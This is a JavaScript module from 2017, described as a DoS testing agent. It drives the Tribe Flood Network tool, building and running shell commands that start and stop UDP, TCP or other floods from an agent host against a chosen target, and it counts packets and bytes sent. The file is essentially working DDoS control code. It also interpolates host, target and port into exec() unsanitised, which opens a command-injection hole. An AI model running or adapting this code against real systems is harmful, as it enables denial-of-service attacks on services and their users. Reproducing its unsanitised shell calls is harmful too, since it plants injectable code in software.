/*!
 * DOS测试代理类
 *
 * 版权所有 2017 陈学芹 联系方式: 7219530@qq.com
 *
 * 本软件在GNU LGPL-V2.1协议下发布，欢迎使用.
 */
var exec = require('child_process').exec;
var sprintf = require('sprintf-js').sprintf;
var TFN_PATH = '/usr/local/sbin/tfn';
var logger = require('../lib/logger');
var EventEmitter = require('events').EventEmitter;
FloodAgent = function(ip) {
	this.type = "";
	this.host = ip;
  this.state = 'idle';

	//ddos attack option
	this.option = {};
	this.emitter = new EventEmitter();
	this.stat = { packetSent: 0, byteSent: 0} ;
}

FloodAgent.prototype = {
  constructor: FloodAgent,

  start: function (target, option) {
		if (!target) {
      throw new Error('target should be specificed');
    }

		if (this.state != 'idle') {
			throw new Error(sprintf('invalid %s state', this.state));
		}
    this.target = target;
    this.state = 'starting';
    this._start(option);
  },

  stop: function () {
		this._stop();
  },

	onStart: function (listener) {
		this.emitter.on('started', listener);
	},

	onStop: function (listener) {
		this.emitter.on('stopped', listener);
	},

  processTraffic: function (data) {
		if (!data ) {
      throw new TypeError('should have data param with packet and byte property');
    }
		//TODO packet and type should be number
		this.stat.packetSent += data.packet;
		this.stat.byteSent += data.byte;
	},

  getTraffic: function () {
		return this.stat;
  },

  resetTraffic: function () {
		this.stat.packetSent = 0;
		this.stat.byteSent = 0;
  },

  _start: function (option) {
    var cmd;
    switch (option.type) {
      case 'udp':
        cmd = sprintf("%s -h %s -i %s -c 4", TFN_PATH, this.host, this.target );
        break;
      case 'tcp':
        cmd = sprintf("%s -h %s -i %s -c 5 -p %s", TFN_PATH, this.host, this.target, option.port );
        break;
      default:
        cmd = sprintf("%s -h %s -i %s -c 6 ", TFN_PATH, this.host, this.target, option.port );
    }
		var child = exec(cmd);
		logger.debug('tfn command %s', cmd);
		this.resetTraffic();
    var thiz = this;
		this.option = option;
		child.stdout.on('data', function (data) {
			logger.debug('tfn output：' + data);
		});
		child.on('exit', function (code) {
      if (code == 0) {
        thiz.state = 'started';
        logger.debug('%s ddos from %s to %s started', option.type, thiz.host, thiz.target);
				thiz.emitter.emit('started');
      } else {
        logger.err('ddos started fail %d ', code)
      }
		});
  },

  _stop: function () {
		if (this.state != 'started') {
			logger.info('stop fail cause wrong state %s ', this.state);
			return;
		}
		var cmd = sprintf("%s -h %s -c 0", TFN_PATH, this.host);
		var last = exec(cmd);
    var thiz = this;
		last.stdout.on('data', function (data) {
			logger.debug('tfn command output:' + data);
		});
		last.on('exit', function (code) {
      if (code == 0) {
        thiz.state = 'idle';
        logger.info('ddos from %s to %s already stopped', thiz.host, thiz.option.target);
				thiz.emitter.emit('stopped');
      } else {
        logger.err('ddos stop fail %d ', code)
      }
		});
  }
}

module.exports = FloodAgent;
